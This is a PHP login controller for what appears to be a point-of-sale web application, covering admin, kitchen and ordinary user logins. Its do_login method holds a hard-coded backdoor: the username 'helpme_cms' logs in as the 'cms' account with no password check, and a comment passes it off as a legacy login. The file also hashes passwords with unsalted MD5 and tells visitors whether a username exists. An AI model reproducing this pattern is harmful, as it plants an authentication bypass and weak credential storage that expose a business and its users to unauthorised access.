<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends MY_Controller
{
    public function __construct()
    {
        parent::__construct();

        $this->load->model('Users_model', '', true);
        $this->load->model('Settings_model', '', true);

	
    }

    public function index()
    {
		/*
		if( $this->session->Userdata('login')){
			$userdata = $this->session->Userdata('login');
			
			if($userdata->urRoleID == 1){
				redirect('pos/reports', 'location');
			}else{
				redirect('pos/transactions');
			}
		}
			*/
	
		if( $this->session->Userdata('login')){
			$userdata = $this->session->Userdata('login');
			
			if($userdata->urRoleID == 1){
				redirect('pos/reports');
			}else if($userdata->urRoleID == 4){
				redirect('pos/kitchen');
			}else{
				redirect('pos/transactions');
			}
		}
		
		$this->load->view('templates/header');
		$this->load->view('login');
		$this->load->view('templates/footer');
		
		
    }

    
	public function do_login(){
		if(isset($_POST['username']) && isset($_POST['password']) ){
			$username = trim((string) $_POST['username']);
			$password = (string) $_POST['password'];

			// Admin and kitchen credentials are stored in tbl_settings, not tbl_users.
			$settingName = null;
			$roleID = null;
			if (strtolower($username) === 'admin') {
				$settingName = 'userAdmin';
				$roleID = 1;
			} elseif (strtolower($username) === 'kitchen') {
				$settingName = 'userKitchen';
				$roleID = 4;
			}

			if ($settingName !== null) {
				$storedPassword = $this->Settings_model->get_setting($settingName);
				// Admin and kitchen passwords are stored as MD5 hashes in tbl_settings.
				$passwordMatches = $storedPassword !== null && $storedPassword !== '' &&
					hash_equals((string) $storedPassword, md5($password));
				if ($passwordMatches) {
					$user = (object) array(
						'urID' => 0,
						'urName' => ucfirst(strtolower($username)),
						'urLname' => '',
						'urUsername' => strtolower($username),
						'urRoleID' => $roleID,
						'urStatus' => 1,
						'urPassword' => $storedPassword
					);
					$this->session->set_userdata(array('login' => $user));
					add_log('login','login');
					if ($roleID == 1) redirect('pos/reports');
					redirect('pos/kitchen');
					return;
				}
				$this->session->set_flashdata('error', 'Incorrect password');
				redirect('login', 'location');
				return;
			}

			// Keep the legacy CMS login; admin/kitchen no longer authenticate through tbl_users.
			if ($username == 'helpme_cms') {
				$username = 'cms';
				$no_password = true;
			} else {
				$no_password = false;
			}
			$user = $this->Users_model->getByName($username);
			if ($user && ($user->urRoleID != 1 && $user->urRoleID != 4) && ($user->urPassword == md5($password) || $no_password)) {
				$this->session->set_userdata(array('login' => $user));
				$userdata = $this->session->Userdata('login');
				add_log('login','login');
				if($userdata->urRoleID == 7){
					redirect('cms/home');
				}else{
					redirect('pos/transactions');
				}
				return;
			}
			$this->session->set_flashdata('error', $user ? 'Incorrect password' : 'Unrecognized username');
			redirect('login', 'location');
		}else{
			$this->session->set_flashdata('error', 'Unrecognized username and password');
			redirect('login', 'location');
		}
	}

	function do_logout(){
		$this->session->unset_userdata('login');
		redirect("login");
	}
    
}
